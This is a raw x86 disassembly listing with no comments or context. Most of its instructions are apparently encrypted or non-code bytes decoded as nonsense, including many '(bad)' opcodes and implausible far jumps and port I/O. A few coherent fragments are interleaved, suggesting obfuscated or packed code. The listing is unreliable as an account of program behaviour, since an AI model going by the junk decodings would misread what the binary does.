  4079d7:	or     eax,0x183e604d
  4079dc:	mov    WORD PTR [edx+0x28],ds
  4079df:	jl     0x4079d7
  4079e1:	dec    edx
  4079e2:	xor    BYTE PTR [ebp+0x12dbf568],ch
  4079e8:	pop    esi
  4079e9:	pop    esp
  4079ea:	out    0x51,eax
  4079ec:	bound  edi,QWORD PTR [ecx-0x1fdb5190]
  4079f2:	push   edi
  4079f3:	iret   
  4079f4:	repz std 
  4079f6:	dec    edi
  4079f7:	test   DWORD PTR [ebp-0x2308d295],edi
  4079fd:	and    dh,BYTE PTR [edx]
  4079ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a00:	add    BYTE PTR [eax],al
  407a02:	pop    ds
  407a03:	xchg   ebx,eax
  407a04:	pop    edx
  407a05:	loope  0x40799a
  407a07:	stos   BYTE PTR es:[edi],al
  407a08:	into   
  407a09:	dec    ebp
  407a0a:	xchg   ebp,eax
  407a0b:	xor    ecx,edi
  407a0d:	mov    ch,bl
  407a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a10:	xchg   esi,eax
  407a11:	sbb    esp,DWORD PTR [edi-0x72]
  407a14:	and    ah,dh
  407a16:	arpl   WORD PTR [esi+0x76277214],dx
  407a1c:	dec    esi
  407a1d:	cmc    
  407a1e:	mov    bh,0x99
  407a20:	stos   BYTE PTR es:[edi],al
  407a21:	xchg   esp,eax
  407a22:	push   eax
  407a23:	xor    ah,BYTE PTR [edx]
  407a25:	dec    edx
  407a26:	shr    BYTE PTR [eax],0x23
  407a29:	push   ebx
  407a2a:	or     eax,0x95bf35bf
  407a2f:	bound  edi,QWORD PTR [edi+0x4d70cccf]
  407a35:	cmpxchg BYTE PTR [edx-0x3c2f1b9d],ch
  407a3c:	imul   edx,DWORD PTR ds:0xb820620c,0x38b01063
  407a46:	les    eax,FWORD PTR [ebp-0x7c83caeb]
  407a4c:	cmp    DWORD PTR [ebx+0x74adc0a2],esp
  407a52:	popf   
  407a53:	ror    BYTE PTR [ecx+0x38],1
  407a56:	mov    ds:0xbac8b9f2,al
  407a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a5c:	dec    ebx
  407a5d:	add    eax,0xe7e88e16
  407a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a63:	cmp    eax,0x821933e2
  407a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a69:	mov    esp,0x4fa22734
  407a6e:	or     DWORD PTR [esp+ebp*8+0x4c30075],0xffffff87
  407a76:	lds    edi,FWORD PTR [ebx]
  407a78:	mov    cs,WORD PTR [eax]
  407a7a:	clc    
  407a7b:	ja     0x407a8e
  407a7d:	xlat   BYTE PTR gs:[ebx]
  407a7f:	aam    0x8e
  407a81:	aam    0x68
  407a83:	add    edi,DWORD PTR [edx-0x21]
  407a86:	and    al,0x6e
  407a88:	test   eax,0x9f05898a
  407a8d:	pop    ebx
  407a8e:	push   ecx
  407a8f:	mov    dh,BYTE PTR [esi+ebx*1+0x24ab49b]
  407a96:	or     al,0xbc
  407a98:	bound  ecx,QWORD PTR es:[ebp+0x367da84c]
  407a9f:	add    dl,BYTE PTR [edi+0xc4d50aa]
  407aa5:	jns    0x407afc
  407aa7:	jmp    0x5103:0xe50d9451
  407aae:	push   ss
  407aaf:	push   ecx
  407ab0:	ss xchg esp,eax
  407ab2:	jmp    0xdb3432a0
  407ab7:	mov    al,0xec
  407ab9:	rol    BYTE PTR [edi],1
  407abb:	scas   al,BYTE PTR es:[edi]
  407abc:	add    esi,DWORD PTR [ebx+esi*1-0x2d]
  407ac0:	mov    cl,0xe5
  407ac2:	cmp    BYTE PTR [edx+0xa],dl
  407ac5:	add    eax,0x33a7c895
  407aca:	adc    cl,BYTE PTR [ecx]
  407acc:	or     eax,0x8770f4dc
  407ad1:	stc    
  407ad2:	inc    ecx
  407ad3:	outs   dx,DWORD PTR ds:[esi]
  407ad4:	into   
  407ad5:	xor    dh,BYTE PTR [ebx+0x27414c10]
  407adb:	push   edx
  407adc:	js     0x407aef
  407ade:	mov    al,BYTE PTR [ebp+eax*1-0x6f]
  407ae2:	mov    esp,0x316c4b10
  407ae7:	mov    dl,0x46
  407ae9:	xor    esp,eax
  407aeb:	xor    esp,ebx
  407aed:	and    BYTE PTR [edx],dh
  407aef:	out    0x98,eax
  407af1:	xchg   edx,eax
  407af2:	or     DWORD PTR [eax+0x7dd3cdfd],esi
  407af8:	cmp    DWORD PTR [edi-0x6],ebp
  407afb:	xchg   esp,eax
  407afc:	or     al,0x8e
  407afe:	jmp    0xa3824cc3
  407b03:	xchg   ecx,eax
  407b04:	and    eax,0x24307662
  407b09:	cmp    DWORD PTR [esi+0x510800cc],0x30
  407b10:	mov    al,0x49
  407b12:	add    DWORD PTR [esp+ecx*1+0x458b254e],ecx
  407b19:	or     BYTE PTR [edi],cl
  407b1b:	mov    bh,0x4
  407b1d:	nop
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	mov    ch,ah
  407b4d:	lahf   
  407b4e:	mov    bh,BYTE PTR [ebp-0x3b]
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407bd7
  407b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b59:	out    dx,al
  407b5a:	fdivr  QWORD PTR [ecx+0x79c42ba7]
  407b60:	mov    eax,0xaf699092
  407b65:	sub    bh,BYTE PTR [esp+ebp*1]
  407b68:	clc    
  407b69:	cmp    al,0xdb
  407b6b:	mov    ch,0x67
  407b6d:	shl    BYTE PTR [edx+0x7b],cl
  407b70:	xor    DWORD PTR [eax],esp
  407b72:	inc    edx
  407b73:	xor    BYTE PTR [ebp-0x72],ah
  407b76:	xchg   ebx,eax
  407b77:	fstp   DWORD PTR [ebx+ebp*1]
  407b7a:	mov    ebx,0xf2ebbec4
  407b7f:	pushf  
  407b80:	test   esp,ecx
  407b82:	sub    DWORD PTR [esi],edx
  407b84:	sub    eax,0xd39799a1
  407b89:	xor    al,0x92
  407b8b:	pushf  
  407b8c:	and    eax,eax
  407b8e:	mov    ecx,ebp
  407b90:	push   ss
  407b91:	sbb    ecx,DWORD PTR [eax+ebx*1]
  407b94:	rcl    BYTE PTR [ebx+0x2c],cl
  407b97:	iret   
  407b98:	mov    bh,0xc
  407b9a:	push   ebx
  407b9b:	dec    ebp
  407b9c:	sub    ebx,DWORD PTR [eax]
  407b9e:	or     BYTE PTR [ebx+eax*4+0x63],0xcd
  407ba3:	shl    DWORD PTR [ecx+eax*2+0x2c0ee7a5],0x5f
  407bab:	imul   BYTE PTR [ecx]
  407bad:	xor    bl,cl
  407baf:	xor    eax,0x1ffb8892
  407bb4:	idiv   DWORD PTR [ecx+esi*2+0xa]
  407bb8:	in     eax,0xc1
  407bba:	push   esp
  407bbb:	(bad)  
  407bbc:	jae    0x407b67
  407bbe:	out    0x28,eax
  407bc0:	fs adc al,0x67
  407bc3:	clc    
  407bc4:	sti    
  407bc5:	dec    esi
  407bc6:	(bad)  
  407bc8:	adc    al,0x21
  407bca:	push   edx
  407bcb:	sub    esi,DWORD PTR [ecx+0x653b972b]
  407bd1:	mov    eax,ds:0x37068f90
  407bd6:	inc    esp
  407bd7:	dec    eax
  407bd8:	call   DWORD PTR [ebx]
  407bda:	in     al,0x45
  407bdc:	gs inc eax
  407bde:	mov    ecx,0xd4665b91
  407be3:	mov    ecx,0x81e360f6
  407be8:	adc    edx,DWORD PTR [edx-0x10f94b14]
  407bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bef:	cmp    cl,cl
  407bf1:	xor    al,0x6d
  407bf3:	add    al,BYTE PTR ds:0xe7f42fdf
  407bf9:	xchg   ebx,eax
  407bfa:	xor    edx,edx
  407bfc:	out    dx,al
  407bfd:	ret    0xa4f8
  407c00:	out    0x14,eax
  407c02:	scas   al,BYTE PTR es:[edi]
  407c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c04:	icebp  
  407c05:	add    eax,0xc205372c
  407c0a:	imul   eax,DWORD PTR [edx-0x2cb7142a],0x32e86a34
  407c14:	jle    0x407c59
  407c16:	in     al,dx
  407c17:	mov    dh,0x1e
  407c19:	iret   
  407c1a:	dec    ebp
  407c1b:	mov    bl,0x23
  407c1d:	jge    0x407ba1
  407c1f:	inc    esp
  407c20:	(bad)  
  407c21:	cli    
  407c22:	mul    DWORD PTR [edx]
  407c24:	arpl   WORD PTR [esi],di
  407c26:	test   BYTE PTR [ecx],bl
  407c28:	adc    dl,BYTE PTR [esi]
  407c2a:	aas    
  407c2b:	fadd   st(4),st
  407c2d:	enter  0xfd26,0x44
  407c31:	imul   ebp,DWORD PTR [esi+0x7ce0d79f],0xe4108c09
  407c3b:	gs xchg ebp,eax
  407c3d:	add    BYTE PTR [di],dl
  407c40:	push   edx
  407c41:	mov    cl,0x97
  407c43:	in     eax,dx
  407c44:	gs scas al,BYTE PTR es:[edi]
  407c46:	ror    dh,1
  407c48:	add    BYTE PTR ds:0xac35990e,0x68
  407c4f:	js     0x407ca5
  407c51:	jl     0x407bf2
  407c53:	sti    
  407c54:	or     DWORD PTR [esi-0x6be2a8e8],ecx
  407c5a:	xchg   edi,eax
  407c5b:	test   BYTE PTR ds:[eax-0x639c5a21],dh
  407c62:	ja     0x407beb
  407c64:	fnstenv [ebx+0x45]
  407c67:	fisttp DWORD PTR [esi-0x62e54805]
  407c6d:	pop    edi
  407c6e:	dec    esp
  407c6f:	iret   
  407c70:	or     DWORD PTR [ecx],eax
  407c72:	and    ecx,DWORD PTR [edx-0x6a]
  407c75:	es es jo 0x407ca6
  407c79:	out    0xc0,al
  407c7b:	dec    ebp
  407c7c:	add    DWORD PTR [ebx+0x368f4eec],esp
  407c82:	xor    dh,dl
  407c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c85:	mov    dh,0xc1
  407c87:	lock mov BYTE PTR [edi],al
  407c8a:	jnp    0x407c6d
  407c8c:	xchg   ebx,eax
  407c8d:	sub    eax,0xe7ea7e83
  407c92:	push   edx
  407c93:	pmullw mm2,QWORD PTR [ecx+0x2cd6d414]
  407c9a:	push   cs
  407c9b:	aad    0x8
  407c9d:	cli    
  407c9e:	icebp  
  407c9f:	test   DWORD PTR [ebx+0x4f9178f8],0x13a4561d
  407ca9:	sbb    eax,0xa11a557b
  407cae:	pop    eax
  407caf:	push   ebx
  407cb0:	inc    ebx
  407cb1:	and    bl,BYTE PTR [edi]
  407cb3:	fnstenv [esi+0x3d]
  407cb6:	mov    ds:0xd69e932d,eax
  407cbb:	mov    eax,DWORD PTR [ebp-0x8]
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	dec    ebx
  407ce0:	push   edi
  407ce1:	jmp    0xd27e:0x7ec7d1b2
  407ce8:	jg     0x407d68
  407cea:	jle    0x407d5b
  407cec:	jge    0x407d05
  407cee:	ret    0xcbc7
  407cf1:	rcl    DWORD PTR [ebx-0x4c],1
  407cf4:	leave  
  407cf5:	ds jmp 0x3f0e9af0
  407cfb:	push   ebp
  407cfc:	cmp    BYTE PTR [edx],0xb4
  407cff:	and    ch,BYTE PTR [edx]
  407d01:	test   al,0xb4
  407d03:	mov    ch,0x21
  407d05:	(bad)  
  407d06:	xchg   edx,eax
  407d07:	pop    eax
  407d08:	cld    
  407d09:	and    eax,0xc887ce73
  407d0e:	jns    0x407cb3
  407d10:	mov    eax,ds:0x6769d575
  407d15:	mov    ds:0x20834039,eax
  407d1a:	mov    ebp,0x47141328
  407d1f:	imul   edx,DWORD PTR ds:0x98d77b21,0xc0443797
  407d29:	mov    ah,0x35
  407d2b:	jmp    FWORD PTR [edi]
  407d2d:	inc    edi
  407d2e:	ret    0xf388
  407d31:	test   BYTE PTR [esi-0x1b],ch
  407d34:	xor    al,BYTE PTR [edx]
  407d36:	mov    ebx,0x39dd0404
  407d3b:	push   ebp
  407d3c:	adc    eax,0x442b8ee4
  407d41:	push   0x0
  407d43:	imul   ebx,DWORD PTR [esi],0x5e
  407d46:	scas   eax,DWORD PTR es:[edi]
  407d47:	test   BYTE PTR [ecx],ch
  407d49:	iret   
  407d4a:	rol    DWORD PTR [ebx+0x3bfa44fd],1
  407d50:	enter  0x6533,0xec
  407d54:	add    eax,0x3a9412f3
  407d59:	int    0x26
  407d5b:	(bad)  
  407d5c:	mov    edx,0xd04ed72a
  407d61:	mov    ch,0x56
  407d63:	dec    esp
  407d64:	sahf   
  407d65:	mov    ds:0x1e8cea03,al
  407d6a:	or     eax,0xa1c0490b
  407d6f:	jno    0x407d66
  407d71:	mov    esp,0x891f38e1
  407d76:	(bad)  
  407d77:	xchg   esp,eax
  407d78:	dec    esi
  407d79:	jb     0x407cff
  407d7b:	int    0x5d
  407d7d:	xor    al,0xd1
  407d7f:	jp     0x407dff
  407d81:	add    BYTE PTR [edx-0x2b071ca5],dl
  407d87:	dec    eax
  407d88:	or     al,0x7
  407d8a:	(bad)  
  407d8d:	mov    esi,DWORD PTR [eax-0x3827d0be]
  407d93:	pushf  
  407d94:	loopne 0x407d44
  407d96:	test   DWORD PTR [ebx-0x56c5c282],0x14d7440a
  407da0:	(bad)  
  407da1:	sbb    DWORD PTR gs:[edx+0x45d6a5f8],ebx
  407da8:	cmp    DWORD PTR [esi-0x6f],esp
  407dab:	and    al,0x6b
  407dad:	pop    ss
  407dae:	outs   dx,BYTE PTR ds:[esi]
  407daf:	mov    al,0x2c
  407db1:	icebp  
  407db2:	xchg   ebp,eax
  407db3:	fistp  DWORD PTR [ecx+0x47]
  407db6:	(bad)  
  407db7:	mov    ch,0x5a
  407db9:	push   0x187e14e9
  407dbe:	push   edx
  407dc0:	jge    0x407daf
  407dc2:	fwait
  407dc3:	pop    esp
  407dc4:	fs mov ch,0x9f
  407dc7:	ins    DWORD PTR es:[edi],dx
  407dc8:	pop    ds
  407dc9:	xor    bh,bl
  407dcb:	mov    ah,0x99
  407dcd:	cmp    BYTE PTR [esi+eax*4-0x249442f4],0xfe
  407dd5:	push   ds
  407dd6:	mov    eax,ds:0x293e1604
  407ddb:	mov    bh,0x8e
  407ddd:	into   
  407dde:	mov    WORD PTR [eax-0xd0b04b6],?
  407de4:	sub    BYTE PTR [edi],ah
  407de6:	jle    0x407de6
  407de8:	mov    ds:0x863599e6,al
  407ded:	mov    ebp,esi
  407def:	enter  0x583d,0xb4
  407df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df4:	cmp    al,0x15
  407df6:	push   ds
  407df7:	and    BYTE PTR [eax-0x56212339],dl
  407dfd:	dec    esp
  407dfe:	(bad)  [edi-0x56]
  407e01:	test   DWORD PTR [edx],edi
  407e03:	cmp    bh,bl
  407e05:	mov    esp,0x419aa44d
  407e0a:	fld    st(2)
  407e0c:	pushf  
  407e0d:	mov    ebp,0xf3913cf7
  407e12:	iret   
  407e13:	aad    0x2a
  407e15:	xchg   BYTE PTR [esi-0x51ace77d],bh
  407e1b:	inc    ecx
  407e1c:	pop    edi
  407e1d:	scas   eax,DWORD PTR es:[edi]
  407e1e:	xor    eax,0x5b952d44
  407e23:	lahf   
  407e24:	addr16 jne 0x407df9
  407e27:	sub    eax,0x6711d059
  407e2c:	or     eax,0xcc5ae2ce
  407e32:	fidiv  DWORD PTR [ebx]
  407e34:	mov    eax,0x4657a153
  407e39:	jp     0x407e56
  407e3b:	xlat   BYTE PTR ds:[ebx]
  407e3c:	int    0x23
  407e3e:	das    
  407e3f:	jp     0x407dfb
  407e41:	or     al,0xf9
  407e43:	test   al,0x4d
  407e45:	mov    esi,0x4f71348c
  407e4a:	xchg   ebp,eax
  407e4b:	add    BYTE PTR [ecx+0x458936b5],ah
  407e51:	or     BYTE PTR [ebx+0x448a0845],cl
  407e57:	add    eax,0xff558aa8
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0xcc
  407ea7:	dec    ecx
  407ea8:	mov    eax,0x7ed8b5f6
  407ead:	jle    0x407e81
  407eaf:	jg     0x407f2f
  407eb1:	jle    0x407f27
  407eb3:	pop    ss
  407eb4:	bound  edi,QWORD PTR fs:[ebp-0x539e8c1e]
  407ebb:	out    dx,al
  407ebc:	std    
  407ebd:	sub    al,0xf2
  407ebf:	dec    ebx
  407ec0:	mov    esp,0xd5c95583
  407ec5:	dec    ebx
  407ec6:	cmp    BYTE PTR [eax+0x3b],dl
  407ec9:	xchg   esi,eax
  407eca:	mov    ch,0xaa
  407ecc:	sbb    al,0xf4
  407ece:	les    eax,FWORD PTR [edi-0x44]
  407ed1:	dec    ebp
  407ed3:	mov    ch,0xaf
  407ed5:	dec    ebp
  407ed6:	sbb    BYTE PTR [ebx-0x2a],cl
  407ed9:	fld    DWORD PTR [edx+esi*8]
  407edc:	out    dx,eax
  407edd:	test   al,0xed
  407edf:	jmp    0xeb72ec57
  407ee4:	jmp    FWORD PTR [ebx]
  407ee6:	mov    esp,ecx
  407ee8:	adc    edi,0x4f
  407eeb:	jg     0x407edc
  407eed:	mov    bh,0x81
  407eef:	and    cl,BYTE PTR [edi]
  407ef1:	jmp    0x886a:0xe4cad15
  407ef8:	sti    
  407ef9:	adc    ecx,DWORD PTR [ecx+ebp*8+0x353a49da]
  407f00:	adc    bl,ah
  407f02:	dec    eax
  407f03:	and    eax,0xda816029
  407f08:	fcos   
  407f0a:	test   al,0xfa
  407f0c:	jo     0x407f0f
  407f0e:	inc    eax
  407f0f:	into   
  407f10:	jo     0x407f3c
  407f12:	test   BYTE PTR [edi-0x3f],0xd
  407f16:	inc    edx
  407f17:	test   eax,0x983e46f7
  407f1c:	or     eax,0x50fb53e
  407f21:	sbb    ebp,DWORD PTR [ebp+0x39]
  407f24:	dec    ebp
  407f25:	mov    eax,0x11ade0cd
  407f2a:	scas   al,BYTE PTR es:[edi]
  407f2b:	vmwrite esi,DWORD PTR [edx-0x3d]
  407f2f:	inc    esi
  407f30:	dec    edi
  407f31:	jmp    0x407f1f
  407f33:	xor    bl,dl
  407f35:	xchg   edx,eax
  407f36:	cmp    al,0xc4
  407f38:	mov    ah,BYTE PTR [ecx-0x29]
  407f3b:	dec    ebp
  407f3c:	cmp    al,BYTE PTR ds:0x24d81027
  407f42:	mov    ds,WORD PTR gs:[ecx]
  407f45:	push   ecx
  407f46:	out    0xe8,al
  407f48:	cdq    
  407f49:	sub    BYTE PTR [edi-0x5eba0409],bh
  407f4f:	jmp    0x407f34
  407f51:	cwde   
  407f52:	xchg   DWORD PTR [ebx-0x22],ecx
  407f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f56:	mov    al,ds:0x73c6e27
  407f5b:	pop    es
  407f5c:	mov    cl,0x3b
  407f5e:	cmp    DWORD PTR [ebp+0x22],ecx
  407f61:	mov    al,0x30
  407f63:	xor    DWORD PTR [edx+0x24],ecx
  407f66:	mov    ds:0xf64bb826,al
  407f6b:	mov    al,0xac
  407f6d:	call   edx
  407f6f:	syscall 
  407f71:	mov    bl,cl
  407f73:	add    BYTE PTR [ebx],ah
  407f75:	pop    ss
  407f76:	aas    
  407f77:	inc    ebp
  407f78:	js     0x407fc1
  407f7a:	sub    eax,0x7b62f756
  407f7f:	sar    BYTE PTR [eax-0x6f],0x95
  407f83:	cmp    al,0x26
  407f85:	mov    ebp,0x92451e5d
  407f8a:	inc    BYTE PTR [ecx+0x2a]
  407f8d:	scas   al,BYTE PTR es:[edi]
  407f8e:	mov    bl,0x5b
  407f90:	scas   eax,DWORD PTR es:[edi]
  407f91:	jmp    0x5c626e53
  407f96:	mov    ah,0xbd
  407f98:	(bad)  
  407f9a:	lahf   
  407f9b:	fisub  DWORD PTR [esi+0x65]
  407f9e:	in     eax,0x34
  407fa0:	cmp    BYTE PTR [ebx],bh
  407fa2:	dec    esi
  407fa3:	fcmovu st,st(2)
  407fa5:	add    DWORD PTR [ebx-0x51c291d3],ecx
  407fab:	cwde   
  407fac:	ror    BYTE PTR [edi],1
  407fae:	adc    edi,DWORD PTR gs:[esi-0x523faef2]
  407fb5:	push   0x32
  407fb7:	gs and eax,0xb4a15408
  407fbd:	ror    ebp,1
  407fbf:	adc    DWORD PTR [esi-0x20],esi
  407fc2:	loopne 0x407fa7
  407fc4:	jge    0x407fae
  407fc6:	push   ebx
  407fc7:	outs   dx,DWORD PTR ds:[esi]
  407fc8:	mov    ebp,0xce0949bb
  407fcd:	call   0x2a39dfcd
  407fd2:	enter  0xe589,0x2b
  407fd6:	sub    eax,0x158c37b7
  407fdb:	and    edi,DWORD PTR [ebx]
  407fdd:	nop
  407fde:	fist   DWORD PTR ds:0x9c0433f0
  407fe4:	pop    esi
  407fe5:	or     ecx,ebp
  407fe7:	jnp    0x408036
  407fe9:	cld    
  407fea:	inc    ebx
  407feb:	fisub  WORD PTR [edx]
  407fed:	sbb    bl,bh
  407fef:	in     eax,dx
  407ff0:	imul   ecx,DWORD PTR [ebx-0x85f85f2],0x470cb18a
  407ffa:	test   eax,0xf939bc4a
  407fff:	ret    0x7d2d
  408002:	pusha  
  408003:	push   0xffffffc9
  408005:	lock inc eax
  408007:	xchg   edi,eax
  408008:	fcomi  st,st(1)
  40800a:	sar    BYTE PTR [ecx+eiz*4],1
  40800d:	dec    ebp
  40800e:	cli    
  40800f:	xchg   esi,eax
  408010:	shl    DWORD PTR [eax+0x15878a],1
  408016:	mov    DWORD PTR [ebp-0x14],eax
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx+0x50429f68],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x40808f
  408040:	lods   al,BYTE PTR ds:[esi]
  408041:	mov    al,ds:0x2b9c79fd
  408046:	in     al,dx
  408047:	dec    ecx
  408048:	sub    DWORD PTR [esi-0x10c6ad31],esp
  40804e:	and    ebx,eax
  408050:	cmp    ch,BYTE PTR [ebp-0x4d]
  408053:	test   al,0x98
  408056:	push   ss
  408057:	pop    eax
  408058:	push   edx
  408059:	add    bl,BYTE PTR [ecx]
  40805b:	(bad)  
  40805d:	mov    ebp,0x6dc4fc61
  408062:	mov    dl,0x8f
  408064:	jp     0x408097
  408066:	adc    edi,DWORD PTR [esi-0x62]
  408069:	mov    ebp,0xd595c91f
  40806e:	add    al,0x66
  408070:	into   
  408071:	mov    ah,0x4b
  408073:	jae    0x408077
  408075:	fidiv  WORD PTR [eax]
  408077:	xchg   edi,esi
  408079:	fst    st(7)
  40807b:	mov    eax,ds:0x96b78c5
  408080:	rol    BYTE PTR [ecx+edi*8],cl
  408083:	mov    ah,0x76
  408085:	push   edx
  408086:	sbb    eax,DWORD PTR [eax-0x46d92524]
  40808c:	loopne 0x4080c1
  40808e:	mov    ebx,0x2772f383
  408093:	addr16 rcl ch,1
  408096:	dec    eax
  408097:	and    dl,ch
  408099:	pop    edi
  40809a:	add    DWORD PTR [esi],esp
  40809c:	ja     0x40802b
  40809e:	fwait
  40809f:	ins    DWORD PTR es:[edi],dx
  4080a0:	fild   WORD PTR [ebp+0x4a]
  4080a3:	mov    dl,0xb8
  4080a5:	int    0x66
  4080a7:	push   ebx
  4080a8:	pop    ds
  4080a9:	xor    eax,0x50ed1b4
  4080ae:	ins    DWORD PTR es:[edi],dx
  4080af:	xchg   ecx,eax
  4080b0:	stos   BYTE PTR es:[edi],al
  4080b1:	loop   0x40808e
  4080b3:	adc    DWORD PTR [ebx+0x31],esp
  4080b6:	dec    esp
  4080b7:	repz in eax,0x7f
  4080ba:	mov    ds,WORD PTR [ebx+0x6cd95812]
  4080c0:	enter  0x6f63,0x14
  4080c4:	adc    cl,0xd6
  4080c7:	mov    ebp,0xab6d3b14
  4080cc:	out    0x4,al
  4080ce:	fwait
  4080cf:	pop    es
  4080d0:	adc    eax,0x8624a18c
  4080d5:	shl    BYTE PTR [eax+0xe],cl
  4080d8:	mov    al,ds:0xe4ecbd16
  4080dd:	in     al,dx
  4080de:	(bad)
  4080e2:	mov    al,0xe8
  4080e4:	mov    eax,ds:0xaf078dcd
  4080e9:	pushf  
  4080ea:	in     eax,0x98
  4080ec:	jg     0x4080e3
  4080ee:	gs xchg ebp,eax
  4080f0:	jae    0x40813b
  4080f2:	sbb    al,0xa1
  4080f4:	aaa    
  4080f5:	sub    DWORD PTR [esi+0x2b5a86bb],ebp
  4080fb:	sahf   
  4080fc:	jle    0x408161
  4080fe:	neg    BYTE PTR [ebp+0x32]
  408101:	(bad)  
  408102:	popa   
  408103:	arpl   WORD PTR [esi+ecx*4-0x6b91818a],cx
  40810a:	and    al,0x3f
  40810c:	je     0x4080c0
  40810e:	xchg   esi,eax
  40810f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408110:	rcr    BYTE PTR [edi-0x36aa71b9],1
  408116:	fmulp  st(4),st
  408118:	mov    WORD PTR [edx-0x70b0c72f],es
  40811e:	xchg   BYTE PTR [ebx+0x6],dl
  408121:	inc    eax
  408122:	nop
  408123:	sbb    al,0xf
  408125:	push   ss
  408126:	or     ecx,DWORD PTR [esi]
  408128:	sub    DWORD PTR [edi+0x2a90bdf1],esp
  40812e:	arpl   bp,si
  408130:	pop    ds
  408131:	dec    edi
  408132:	arpl   WORD PTR [edi+0x1e],sp
  408135:	push   es
  408136:	mov    esi,0xabafa978
  40813b:	inc    edx
  40813c:	cwde   
  40813d:	mov    esi,0xef02069b
  408142:	ss mov ebp,0xfe94139b
  408148:	sbb    eax,0xac9e0afe
  40814d:	jl     0x4080fc
  40814f:	daa    
  408150:	jmp    0x88e3:0x43d88015
  408157:	xor    eax,0xe2d85537
  40815c:	into   
  40815d:	adc    esi,eax
  40815f:	mov    esi,0x9f738aff
  408164:	icebp  
  408165:	add    esi,esp
  408167:	and    BYTE PTR ds:0xd700c499,ch
  40816d:	aad    0x9e
  40816f:	and    DWORD PTR [ebx+0x5f],edi
  408172:	xchg   ebx,eax
  408173:	push   0xfffffff5
  408175:	ret    
  408176:	js     0x408179
  408178:	call   0x5229:0x390efafa
  40817f:	out    0x76,eax
  408181:	out    dx,eax
  408182:	pop    ebx
  408183:	sbb    al,0x45
  408185:	add    bh,0x82
  408188:	xor    BYTE PTR [esp+edx*4-0x5c626c88],cl
  40818f:	mov    esi,0xf404332f
  408194:	ins    BYTE PTR es:[edi],dx
  408195:	mov    cl,0x70
  408197:	cmp    eax,0xa605eac8
  40819c:	popf   
  40819d:	mov    BYTE PTR cs:[edx],ch
  4081a0:	paddsb mm7,QWORD PTR [esi-0x740fba75]
  4081a7:	push   ebp
  4081a8:	or     BYTE PTR [ebx],dh
  4081aa:	shr    ecx,0x7c
  4081ad:	add    DWORD PTR [eax],eax
  4081af:	add    BYTE PTR [edx-0x80],cl
  4081b2:	fld    QWORD PTR [edi]
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp+0x5d7ba68f]
  4081bf:	ror    BYTE PTR [ebp-0x2d818125],1
  4081c5:	jg     0x408245
  4081c7:	jle    0x408207
  4081c9:	(bad)  
  4081ca:	jg     0x408192
  4081cc:	cmc    
  4081cd:	cmp    edi,0xffffffaa
  4081d0:	aad    0x68
  4081d2:	inc    ecx
  4081d3:	adc    ecx,DWORD PTR [ecx-0x52d87510]
  4081d9:	xchg   ch,cl
  4081db:	inc    ecx
  4081dc:	cmp    ah,BYTE PTR ds:0x47db6ca
  4081e2:	mov    bh,dl
  4081e4:	cs out dx,eax
  4081e6:	not    DWORD PTR [ebp+ebp*8+0x369ecc6a]
